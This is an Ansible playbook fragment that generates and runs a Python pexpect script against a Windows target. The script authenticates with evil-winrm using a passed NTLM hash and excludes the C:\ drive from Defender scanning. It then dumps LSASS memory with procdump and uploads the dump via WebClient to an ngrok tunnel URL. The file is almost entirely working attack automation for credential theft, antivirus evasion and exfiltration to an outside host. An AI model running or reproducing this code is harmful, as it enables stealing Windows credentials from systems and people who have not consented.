---
- name: Read ngrok URL from JSON file
  slurp:
    src: ngrok_url.json
  register: ngrok_url_file

- name: Set ngrok URL as a fact
  set_fact:
    ngrok_url: "{{ (ngrok_url_file.content | b64decode | from_json).ngrok_url }}"
  register: mimikatz_dump_output


- name: Display the output
  debug:
    msg: "{{ mimikatz_dump_output }}"



- name: Create evil-winrm script
  copy:
    dest: /opt/mimikatz_dump.py
    content: |
      import pexpect
      import re

      target_ip = "{{ target_ip }}"
      username = "{{ username }}"
      hash = "{{ ntlm }}"

      command = f"evil-winrm -i {target_ip} -u {username} -H {hash}"

      path=f"""C:\\Users\\{username}\\Documents\\lsass.dmp"""


      set=r"set-mppreference -exclusionpath C:\\"
      dump="./procdump.exe -accepteula -ma lsass.exe lsass.dmp"
      ex_1="[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
      ex_2="$webClient = New-Object System.Net.WebClient;"
      ex_3=f"""$webClient.UploadFile("{{ ngrok_url }}/upload", "POST", "{path}");"""

      winrm=f'PS \x1b[0mC:\\Users\\{username}\\Documents> '
      child = pexpect.spawn(command)
      child.timeout = None
      child.expect(re.escape(winrm))
      child.sendline(set)
      child.expect(re.escape(winrm))
      child.sendline(dump)
      child.expect(re.escape(winrm))
      child.sendline(ex_1)
      child.expect(re.escape(winrm))
      child.sendline(ex_2)
      child.expect(re.escape(winrm))
      child.sendline(ex_3)
      child.expect(re.escape(winrm))
      child.sendline("exit")
      res = child.before + child.after
      print(res)



- name: Make thescript executable
  file:
    path: /opt/mimikatz_dump.py
    mode: '0755'

- name: Run the mimikatz_dump
  shell: python3 /opt/mimikatz_dump.py
  register: mimikatz_dump_output


- name: Display the output
  debug:
    msg: "{{ mimikatz_dump_output }}"
